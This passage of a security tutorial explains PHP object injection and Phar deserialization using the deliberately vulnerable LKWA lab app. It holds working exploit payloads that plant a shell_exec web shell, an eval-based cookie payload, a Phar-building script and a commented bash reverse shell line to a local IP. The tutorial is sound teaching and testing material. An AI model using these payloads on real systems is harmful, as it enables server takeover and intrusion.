  &lt;li&gt;&lt;a href=&quot;https://github.com/v-p-b/DangerousPHPFunctions&quot;&gt;DangerousPHPFunctions - https://github.com/v-p-b/DangerousPHPFunctions&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;When checking projects, &lt;code class=&quot;highlighter-rouge&quot;&gt;git clone&lt;/code&gt; and execute &lt;code class=&quot;highlighter-rouge&quot;&gt;composer install&lt;/code&gt; to install all dependencies, this can then be reviewed for useful POP gadget.&lt;/p&gt;

&lt;h3 id=&quot;example-httpsgithubcomweev3lkwa-object-injection&quot;&gt;Example (https://github.com/weev3/LKWA) Object Injection&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;/assets/phpi/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The following request is submitted by the application &lt;a href=&quot;http://lkwa.local:3000/objectInjection/content.php&quot;&gt;http://lkwa.local:3000/objectInjection/content.php&lt;/a&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;GET /objectInjection/content.php?object=O:8:%22stdClass%22:2:{s:4:%22data%22;s:9:%22Hey%20Dude!%22;s:4:%22text%22;s:26:%22upload%20shell%20if%20you%20can!!!%22;} HTTP/1.1
Host: lkwa.local:3000
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://lkwa.local:3000/objectInjection/content.php
Upgrade-Insecure-Requests: 1
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;The following code is used server-side to unserialize the object.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/weev3/LKWA/blob/master/objectInjection/content.php#L40&quot;&gt;https://github.com/weev3/LKWA/blob/master/objectInjection/content.php#L40&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;if(isset($_REQUEST['object'])){  
$var1=unserialize($_REQUEST['object']);
echo &quot;&amp;lt;br&amp;gt;&quot;;
echo($var1-&amp;gt;data); 
echo &quot;&amp;lt;br&amp;gt;&quot;;
echo($var1-&amp;gt;text);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Within &lt;code class=&quot;highlighter-rouge&quot;&gt;content.php&lt;/code&gt;, the following file is also included:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;include(&quot;obj_injection.php&quot;);
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;obj_injection.php&lt;/code&gt; contains the following code.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;// https://github.com/weev3/LKWA/blob/master/objectInjection/content.php#L3


&amp;lt;?php


class Foo{
    function __construct($filename, $data) {
        $this-&amp;gt;filename = $filename . &quot;.txt&quot;;
        $this-&amp;gt;data = $data;
    }
    function __destruct(){
        file_put_contents($this-&amp;gt;filename, $this-&amp;gt;data);
    }
}
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;This can be exploited using a payload such as:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?php

 class Foo{
    public $filename;
    public $data;

}

$obj = new Foo();
$obj-&amp;gt;filename = '/var/www/html/shell.php';
$obj-&amp;gt;data =  &quot;&amp;lt;?php echo shell_exec(\$_GET['e'].' 2&amp;gt;&amp;amp;1'); ?&amp;gt;&quot;;
 
echo serialize($obj);
 
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Serialized Payload:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;O:3:&quot;Foo&quot;:2:{s:8:&quot;filename&quot;;s:23:&quot;/var/www/html/shell.php&quot;;s:4:&quot;data&quot;;s:45:&quot;&amp;lt;?php echo shell_exec($_GET['e'].' 2&amp;gt;&amp;amp;1'); ?&amp;gt;&quot;;}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;example-httpsgithubcomweev3lkwa-object-injection-cookie&quot;&gt;Example (https://github.com/weev3/LKWA) Object Injection Cookie&lt;/h3&gt;

&lt;p&gt;When the admin logs in the following cookie are set by the application:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/phpi/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;O:8:&quot;stdClass&quot;:1:{s:4:&quot;user&quot;;s:5:&quot;admin&quot;;}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;This is then unserialized:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;//https://github.com/weev3/LKWA/blob/master/objectInjection_cookie/content.php#L43

if(isset($_COOKIE['username']))
{

  $var = unserialize($_COOKIE['username']);
  echo &quot;&amp;lt;br&amp;gt; Welcome &quot;.$var-&amp;gt;user;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Content.php&lt;/code&gt; also includes &lt;code class=&quot;highlighter-rouge&quot;&gt;obj_injection.php&lt;/code&gt; (&lt;code class=&quot;highlighter-rouge&quot;&gt;include(&quot;obj_injection.php&quot;);&lt;/code&gt;) which has the following code:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;//http://lkwa.local:3000/objectInjection_cookie/content.php


&amp;lt;?php

/**
 * Object Injection via Cookie
 */
class Foo{
	public $cmd;
    function __construct() {
    }
    function __destruct(){
        eval($this-&amp;gt;cmd);
    }
}

?&amp;gt;

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;This can be exploited using the following payload&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?php
 

 class Foo{
    public $cmd;

}
///bin/bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.0.11/1234 0&amp;gt;&amp;amp;1
$obj = new Foo();
$obj-&amp;gt;cmd =  &quot;system('uname -a');&quot;;

echo serialize($obj);
 
?&amp;gt;

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;which generates the following serialized payload&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;O:3:&quot;Foo&quot;:1:{s:3:&quot;cmd&quot;;s:19:&quot;system('uname -a');&quot;;}

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;This can now be set as a cookie and can be sent to the page to execute &lt;code class=&quot;highlighter-rouge&quot;&gt;uname -a&lt;/code&gt; on the local system.&lt;/p&gt;

&lt;h3 id=&quot;example-httpsgithubcomweev3lkwa-object-injection-reference&quot;&gt;Example (https://github.com/weev3/LKWA) Object Injection Reference&lt;/h3&gt;

&lt;p&gt;A serialized payload sent from a user request is deserialized as follows:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;//https://github.com/weev3/LKWA/blob/master/objectref/objectref.php
                  if (isset($_POST['guess'])) {
                    // code...
                    $obj = unserialize($_POST['input']);
                    if($obj) {
                        $obj-&amp;gt;guess = $_POST['guess'];
                        $obj-&amp;gt;secretCode = rand(500000,999999);
                        if($obj-&amp;gt;guess === $obj-&amp;gt;secretCode) {
                            echo &quot;&amp;lt;p class='text-success'&amp;gt;You Win !!!!!&amp;lt;/p&amp;gt;&quot;;
                        }
                        else{
                        	echo &quot;&amp;lt;p class='text-danger'&amp;gt;Loser!!!!&amp;lt;/p&amp;gt;&quot;;
                        }
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;This check can be bypassed by calling both objects and referencing each other.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?php
 

 class Object1
 {
   public $guess;
   public $secretCode;
 }
 
$obj = new Object1();
$obj-&amp;gt;guess =  &amp;amp;$obj-&amp;gt;secretCode;
echo serialize($obj);
 
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Payload:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;O:7:&quot;Object1&quot;:2:{s:5:&quot;guess&quot;;N;s:10:&quot;secretCode&quot;;R:2;}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;The following request can now be sent&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /objectref/objectref.php HTTP/1.1
Host: lkwa.local:3000
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 112
Origin: http://lkwa.local:3000
Connection: close
Referer: http://lkwa.local:3000/objectref/objectref.php
Cookie: PHPSESSID=741de8227f5dedc8918a2018980d0819; username=O%3A8%3A%22stdClass%22%3A1%3A%7Bs%3A4%3A%22user%22%3Bs%3A5%3A%22admin%22%3B%7D
Upgrade-Insecure-Requests: 1

guess=ss&amp;amp;input=%4f%3a%37%3a%22%4f%62%6a%65%63%74%31%22%3a%32%3a%7b%73%3a%35%3a%22%67%75%65%73%73%22%3b%4e%3b%73%3a%31%30%3a%22%73%65%63%72%65%74%43%6f%64%65%22%3b%52%3a%32%3b%7d
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;real-world-vulnerabilities&quot;&gt;Real World Vulnerabilities&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://websec.wordpress.com/2015/01/09/drupal-7-34-admin-php-object-injection/&quot;&gt;Drupal 7.34 Admin PHP Object Injection&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://blog.redforce.io/attacking-helpdesks-part-1-rce-chain-on-deskpro-with-bitdefender-as-case-study/&quot;&gt;Executing Arbitrary Code on Bitdefender Helpdesk&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://blog.ripstech.com/2018/prestashop-remote-code-execution/&quot;&gt;Prestashop Remote Code Execution&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;useful-notes&quot;&gt;Useful Notes&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Leading zeroes &amp;amp; Arbitrary Chars can be used which won‚Äôt change logic: &lt;code class=&quot;highlighter-rouge&quot;&gt;O:008:&quot;stdClass&quot;:0001**s:006:&quot;bypass&quot;;b:1;}&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;One way to find PHP deserialization black box is to provide a serialized &lt;code class=&quot;highlighter-rouge&quot;&gt;PDO&lt;/code&gt; object to injection points. This will usually end in an error 500 response which is an indication of PHP deserialization. The &lt;code class=&quot;highlighter-rouge&quot;&gt;php-object-injection-check&lt;/code&gt; burp extension can be used to automate this: &lt;a href=&quot;https://github.com/securifybv/PHPUnserializeCheck&quot;&gt;https://github.com/securifybv/PHPUnserializeCheck&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/ricardojba/poi-slinger&quot;&gt;https://github.com/ricardojba/poi-slinger&lt;/a&gt; burp extension can be used to quickly create out of band payloads from &lt;code class=&quot;highlighter-rouge&quot;&gt;PHPGGC&lt;/code&gt; during testing.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;how-to-patch&quot;&gt;How to Patch&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Use a safe, standard data interchange format such as JSON (via &lt;code class=&quot;highlighter-rouge&quot;&gt;json_decode()&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;json_encode()&lt;/code&gt;) if you need to pass serialized data to the user.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;referencesfurther-reading&quot;&gt;References/Further Reading&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://notsosecure.com/remote-code-execution-via-php-unserialize/&quot;&gt;https://notsosecure.com/remote-code-execution-via-php-unserialize/&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection&quot;&gt;https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.pentestpeople.com/php-deserialisation-object-injection/&quot;&gt;https://www.pentestpeople.com/php-deserialisation-object-injection/&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://securitycafe.ro/2015/01/05/understanding-php-object-injection/&quot;&gt;https://securitycafe.ro/2015/01/05/understanding-php-object-injection/&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://insomniasec.com/cdn-assets/Practical_PHP_Object_Injection.pdf&quot;&gt;https://insomniasec.com/cdn-assets/Practical_PHP_Object_Injection.pdf&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.synacktiv.com/en/publications/typo3-leak-to-remote-code-execution.html&quot;&gt;https://www.synacktiv.com/en/publications/typo3-leak-to-remote-code-execution.html&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://web.archive.org/web/20150317142538/https://scott.arciszewski.me/research/view/php-framework-timing-attacks-object-injection&quot;&gt;php-framework-timing-attacks-object-injection&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://blog.redteam-pentesting.de/2021/deserialization-gadget-chain/&quot;&gt;PHP Deserialization Gadget Chains&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/orangetw/My-CTF-Web-Challenges/blob/master/README.md#babyh-master-php-2017&quot;&gt;babyh-master-php-2017&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/TYPO3/phar-stream-wrapper&quot;&gt;phar-stream-wrapper&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://srcincite.io/blog/2018/10/02/old-school-pwning-with-new-school-tricks-vanilla-forums-remote-code-execution.html&quot;&gt;Vanilla Forums RCE&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.slideshare.net/_s_n_t/php-unserialization-vulnerabilities-what-are-we-missing&quot;&gt;PHP Deserialization - What are we missing&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;phar-file-format&quot;&gt;Phar File Format&lt;/h3&gt;

&lt;p&gt;Phar (PHP Archive) files can be used to package PHP applications and PHP libraries into one archive file. The PHAR format in PHP uses single file format which can be used to store and execute multiple PHP code. Phar files contain metadata about the files in the archive. In a phar file, metadata is stored in a serialized format&lt;/p&gt;

&lt;p&gt;A structure of a PHAR file is as follows:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;* A stub ‚Äì which is a PHP code sequence acting as a bootstrapper when the Phar is being run as a standalone application; as a minimum, it must contain the following code:
`&amp;lt;?php __HALT_COMPILER();`
* A manifest describing a source file included in the archive; optionally, holds serialized meta-data (this serialized chunk is a critical link in the exploitation chain as we will see further on)
* A source file (the actual Phar functionality)
* An optional signature, used for integrity checks
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Phar files can be called using the following URI: &lt;code class=&quot;highlighter-rouge&quot;&gt;phar://full/or/relative/path&lt;/code&gt;. Furthermore, a phar file extension doesn‚Äôt get checked when declaring a stream, making phar files veritable polyglot candidates. If a filesystem function is called with a phar stream as an argument, the Phar‚Äôs serialized metadata automatically gets unserialized, by design. More about the PHP Phar format can be seen here: &lt;a href=&quot;https://www.php.net/manual/en/book.phar.php&quot;&gt;https://www.php.net/manual/en/book.phar.php&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;phar-deserialization&quot;&gt;Phar Deserialization&lt;/h3&gt;

&lt;p&gt;Discovered by Sam Thomas and initially discovered by Orange Tsai (Separately), if a file operation is performed on a &lt;code class=&quot;highlighter-rouge&quot;&gt;phar&lt;/code&gt; file via the &lt;code class=&quot;highlighter-rouge&quot;&gt;phar://&lt;/code&gt; wrapper, the phar file‚Äôs metadata would be unserialized. As such an attacker could perform PHP object injection without the use of the &lt;code class=&quot;highlighter-rouge&quot;&gt;unserialize()&lt;/code&gt; function by uploading a phar file.&lt;/p&gt;

&lt;p&gt;Sam Thomas‚Äôs work can be seen below:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It.pdf&quot;&gt;BlackHat USA 2018 - Its A PHP Unserialization Vulnerability Jim But Not As We Know It Slides&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=OrEar0TiS90&quot;&gt;BlackHat USA 2018 - Its A PHP Unserialization Vulnerability Jim But Not As We Know It Video&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;requirements-for-a-successful-phar-deserialization&quot;&gt;Requirements for a Successful Phar Deserialization&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;A PHP filesystem function that can be controlled which will trigger  &lt;code class=&quot;highlighter-rouge&quot;&gt;unserialize()&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;The ability to upload a PHAR file to the target system and the path of this file to be known&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The following file system functions can trigger &lt;code class=&quot;highlighter-rouge&quot;&gt;unserialize()&lt;/code&gt; by providing a &lt;code class=&quot;highlighter-rouge&quot;&gt;phar://&lt;/code&gt; wrapper&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;copy                file_exists         file_get_contents   file_put_contents   
file                fileatime           filectime           filegroup           
fileinode           filemtime           fileowner           fileperms           
filesize            filetype            fopen               is_dir              
is_executable       is_file             is_link             is_readable         
is_writable         lstat               mkdir               parse_ini_file      
readfile            rename              rmdir               stat                
touch               unlink              
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; Just like normal object injection, PHP Magic Methods and autoloading/include of the POP gadget to trigger is still needed.&lt;/p&gt;

&lt;h3 id=&quot;example-httpsgithubcomweev3lkwa-phar-deserialization&quot;&gt;Example (https://github.com/weev3/LKWA) Phar Deserialization&lt;/h3&gt;

&lt;p&gt;An upload functionality exists in &lt;code class=&quot;highlighter-rouge&quot;&gt;upload.php&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/phpi/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?php
include(&quot;sidebar.php&quot;);
$target_dir = &quot;uploads/&quot;;
$target_file = $target_dir . basename($_FILES[&quot;fileToUpload&quot;][&quot;name&quot;]);
$uploadOk = 1;
$imageFileType = strtolower(pathinfo($target_file,PATHINFO_EXTENSION));
// Check if image file is a actual image or fake image
if(isset($_POST[&quot;submit&quot;])) {
    if($imageFileType !== &quot;PHAR&quot;) {
        $uploadOk = 1;
    } else {
        echo &quot;File is not a PHAR file.&quot;;
        $uploadOk = 0;
    }
}
// Check if file already exists
if (file_exists($target_file)) {
    echo &quot;Sorry, file already exists.&quot;;
    $uploadOk = 0;
}

// Allow certain file formats
if($imageFileType != &quot;phar&quot;) {
    echo &quot;Sorry, only PHAR file is allowed.&quot;;
    $uploadOk = 0;
}
// Check if $uploadOk is set to 0 by an error
if ($uploadOk == 0) {
    echo &quot;Sorry, your file was not uploaded.&quot;;
// if everything is ok, try to upload file
} else {
    if (move_uploaded_file($_FILES[&quot;fileToUpload&quot;][&quot;tmp_name&quot;], $target_file)) {
        echo &quot;The file &quot;. basename( $_FILES[&quot;fileToUpload&quot;][&quot;name&quot;]). &quot; has been uploaded.&quot;;
    } else {
        echo &quot;Sorry, there was an error uploading your file.&quot;;
    }
}
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;&lt;em&gt;https://github.com/weev3/LKWA/blob/master/phar_deserial/upload.php&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;This above code checks if a given upload is a phar file, the &lt;code class=&quot;highlighter-rouge&quot;&gt;file_exists&lt;/code&gt; function is also used to see if the file has already been uploaded. Aftr the checks, the file is uploaded. This functionality can be used to upload a PHAR file.&lt;/p&gt;

&lt;p&gt;Within &lt;code class=&quot;highlighter-rouge&quot;&gt;phar_deserial.php&lt;/code&gt;, the following code can be seen:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;include(&quot;sidebar.php&quot;);

class log
{
	public $filename=&quot;log.txt&quot;;
	public $data=&quot;log&quot;;
    function __wakeup(){
        file_put_contents($this-&amp;gt;filename, $this-&amp;gt;data);
    }
}

if (file_exists($_GET['file'])) {
 $var = new log();
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;&lt;em&gt;https://github.com/weev3/LKWA/blob/master/phar_deserial/phar_deserial.php&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Since the &lt;code class=&quot;highlighter-rouge&quot;&gt;file_exists($_GET['file']&lt;/code&gt; function is used with a user provided input. It is possible to set the value of the input to the previously uploaded Phar file. Example: &lt;code class=&quot;highlighter-rouge&quot;&gt;phar://../uploads/phar_file.phar&lt;/code&gt;. The PHP application will perform a filesystem call on the provided wrapper, such as verifying if the file exists on the disk by calling &lt;code class=&quot;highlighter-rouge&quot;&gt;file_exists(&quot;phar://../uploads/phar_file.phar&quot;)&lt;/code&gt;. and the Phar‚Äôs metadata will be unserialized, taking advantage of the gadgets/POP chains to complete the exploitation chain. In this instance, the &lt;code class=&quot;highlighter-rouge&quot;&gt;__wakeup&lt;/code&gt; magic method can be leveraged for code execution by writing some PHP code and calling it.&lt;/p&gt;

&lt;p&gt;The following code can be used to create a PHAR file&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?php
class log
{
    
    function __wakeup(){
    }
}

$payload = new log();
$payload-&amp;gt;filename = 'shell.php5';
$payload-&amp;gt;data = &quot;&amp;lt;?php echo shell_exec(\$_GET['e'].' 2&amp;gt;&amp;amp;1'); ?&amp;gt;&quot;;
var_dump($payload);

// create new Phar
@unlink(&quot;payload.phar&quot;);
$phar = new Phar('payload.phar');
$phar-&amp;gt;startBuffering();
$phar-&amp;gt;addFromString('test.txt', 'text');
$phar-&amp;gt;setStub('&amp;lt;?php __HALT_COMPILER(); ? &amp;gt;');
//set payload
$phar-&amp;gt;setMetadata($payload);
$phar-&amp;gt;stopBuffering();
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;This phar file can be uploaded using &lt;code class=&quot;highlighter-rouge&quot;&gt;upload.php&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/phpi/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This &lt;code class=&quot;highlighter-rouge&quot;&gt;payload.phar&lt;/code&gt; can be called through the &lt;code class=&quot;highlighter-rouge&quot;&gt;phar_deserial.php&lt;/code&gt; file.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;GET /phar_deserial/phar_deserial.php?file=phar%3a%2f%2fpharfile.phar HTTP/1.1
Host: lkwa.local:3000
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: username=O%3A8%3A%22stdClass%22%3A1%3A%7Bs%3A4%3A%22user%22%3Bs%3A5%3A%22admin%22%3B%7D
Upgrade-Insecure-Requests: 1
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;To test if things are working locally, you can testing using a code such as&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?php

class log
{
	public $filename=&quot;log.txt&quot;;
	public $data=&quot;log&quot;;
    function __wakeup(){
        file_put_contents($this-&amp;gt;filename, $this-&amp;gt;data);
    }
}

// output: rips
include('phar://payload.phar');


?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;phar-deserialization-real-world-vulnerabilities&quot;&gt;Phar Deserialization Real World Vulnerabilities&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/dompdf/dompdf/pull/1903&quot;&gt;DomPDF Phar Serialization&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.exploit-db.com/exploits/46634&quot;&gt;LimeSurvey &amp;lt; 3.16 - Remote Code Execution&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/mpdf/mpdf/issues/949&quot;&gt;mpdf Insecure PHP deserialization through phar:// wrapper&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/pear/Archive_Tar/issues/33&quot;&gt;TCPDF Phar Deserialization&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://blog.ripstech.com/2018/phpbb3-phar-deserialization-to-remote-code-execution/&quot;&gt;phpbb3 Phar Deserialization&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.exploit-db.com/exploits/46108&quot;&gt;PEAR Archive_Tar1&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;useful-notes-1&quot;&gt;Useful Notes&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;Inclusion of the Phar file for deserialization can be local or remote&lt;/li&gt;
  &lt;li&gt;If a file upload functionality only allows jpg, you can use a phar-jpg polyglot: https://github.com/kunte0/phar-jpg-polyglot&lt;/li&gt;
  &lt;li&gt;If you are trying to leverage a __destruct magic method as part of your POP chain and the if destructor is never called, you can use ‚Äúfast destruct method‚Äù in PHPGGC to make sure it‚Äôs called right after the unserialize. The -f option with PHPGGC will place your popchain in an array and overwrite its entry with another value, losing the only reference to your instance.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;references&quot;&gt;References&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://blog.ripstech.com/2018/new-php-exploitation-technique/&quot;&gt;https://blog.ripstech.com/2018/new-php-exploitation-technique/&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.drupal.org/sa-core-2020-013&quot;&gt;https://www.drupal.org/sa-core-2020-013&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf&quot;&gt;https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://medium.com/@knownsec404team/extend-the-attack-surface-of-php-deserialization-vulnerability-via-phar-d6455c6a1066&quot;&gt;https://medium.com/@knownsec404team/extend-the-attack-surface-of-php-deserialization-vulnerability-via-phar-d6455c6a1066&lt;/a&gt;&lt;/li&gt;
